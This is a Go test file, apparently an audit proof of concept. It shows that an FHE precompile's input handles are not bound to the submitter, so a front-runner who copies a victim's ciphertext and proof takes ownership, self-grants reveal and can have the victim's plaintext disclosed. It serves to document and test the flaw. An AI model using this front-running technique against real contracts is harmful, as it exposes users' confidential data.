package fhe

import (
	"testing"

	"github.com/ethereum/go-ethereum/common"
)

// Front-running the admission path.
//
// verifyInput derives its handle from the packed arguments alone —
// keccak256(domainTag || "verifyInput" || (ciphertext, proof)) —
// with no caller in the preimage, and registerHandle is
// first-writer-wins. If both hold, then whoever gets a transaction
// carrying (ciphertext, proof) into a block FIRST owns the handle,
// regardless of whose ciphertext it is. Ownership carries the right
// to self-grant reveal, so the front-runner can ask the committee
// to disclose the victim's plaintext input.
//
// These tests do not simulate a mempool. They isolate the claim:
// ordering alone decides ownership.

var (
	victimV   = common.HexToAddress("0xD000000000000000000000000000000000000004")
	attackerE = common.HexToAddress("0xE000000000000000000000000000000000000005")
)

// admissionHandle reproduces exactly what Run does for verifyInput.
func admissionHandle(
	t *testing.T, p *Precompile, ct, proof []byte,
) common.Hash {
	t.Helper()
	m := p.abi.Methods[VerifyInputMethod]
	argBz, err := m.Inputs.Pack(ct, proof)
	if err != nil {
		t.Fatalf("pack verifyInput args: %v", err)
	}
	return p.deriveHandle(&m, argBz)
}

// Root cause: identical inputs from different submitters collide.
func TestAdmissionHandleIsNotBoundToSubmitter(t *testing.T) {
	p := mustPrecompile(t)
	ct := []byte("victim ciphertext bytes")
	proof := []byte("victim input proof")

	if admissionHandle(t, p, ct, proof) !=
		admissionHandle(t, p, ct, proof) {
		t.Fatal("handles differ — admission is caller-bound")
	}
	t.Logf("handle depends on args only: %s",
		admissionHandle(t, p, ct, proof).Hex())
}

// Consequence: the front-runner owns and can disclose the input.
func TestFrontRunnerStealsAdmittedInput(t *testing.T) {
	p, db := mustPrecompile(t), newFakeStore()
	ct := []byte("victim ciphertext bytes")
	proof := []byte("victim input proof")
	h := admissionHandle(t, p, ct, proof)

	// 1. attacker copies (ct, proof) and lands first
	p.registerHandle(db, h, attackerE, KTypeUnknown, false)
	// 2. the victim's own transaction then executes
	p.registerHandle(db, h, victimV, KTypeUnknown, false)

	if got := metaOwner(p.getMeta(db, h)); got != attackerE {
		t.Fatalf("no hijack; owner = %s", got.Hex())
	}

	// 3. an owner may grant itself reveal
	am := p.abi.Methods[AllowMethod]
	allowArgs, err := am.Inputs.Pack(
		[32]byte(h), attackerE, uint8(2),
	)
	if err != nil {
		t.Fatalf("pack allow args: %v", err)
	}
	if _, err := p.runAllow(
		db, attackerE, &am, allowArgs,
	); err != nil {
		t.Fatalf("self-grant refused: %v", err)
	}

	// 4. the committee would serve that reveal
	if err := p.checkServable(
		db, attackerE, RequestRevealMethod, h.Bytes(),
	); err != nil {
		t.Fatalf("reveal refused, attack incomplete: %v", err)
	}

	// 5. and the victim cannot read their own input
	wantErr(t, p.checkServable(
		db, victimV, RequestReencryptMethod, h.Bytes(),
	), "not authorized")

	t.Log("ATTACK CONFIRMED: front-runner can reveal " +
		"the victim's admitted plaintext")
}

// Control: identical state, only the ordering differs.
func TestWithoutFrontRunVictimRetainsControl(t *testing.T) {
	p, db := mustPrecompile(t), newFakeStore()
	h := admissionHandle(t, p,
		[]byte("victim ciphertext bytes"),
		[]byte("victim input proof"))

	p.registerHandle(db, h, victimV, KTypeUnknown, false)

	if got := metaOwner(p.getMeta(db, h)); got != victimV {
		t.Fatalf("victim not owner: %s", got.Hex())
	}
	if err := p.checkServable(
		db, victimV, RequestReencryptMethod, h.Bytes(),
	); err != nil {
		t.Fatalf("owner refused own re-encryption: %v", err)
	}
	wantErr(t, p.checkServable(
		db, attackerE, RequestRevealMethod, h.Bytes(),
	), "reveal not granted")
}
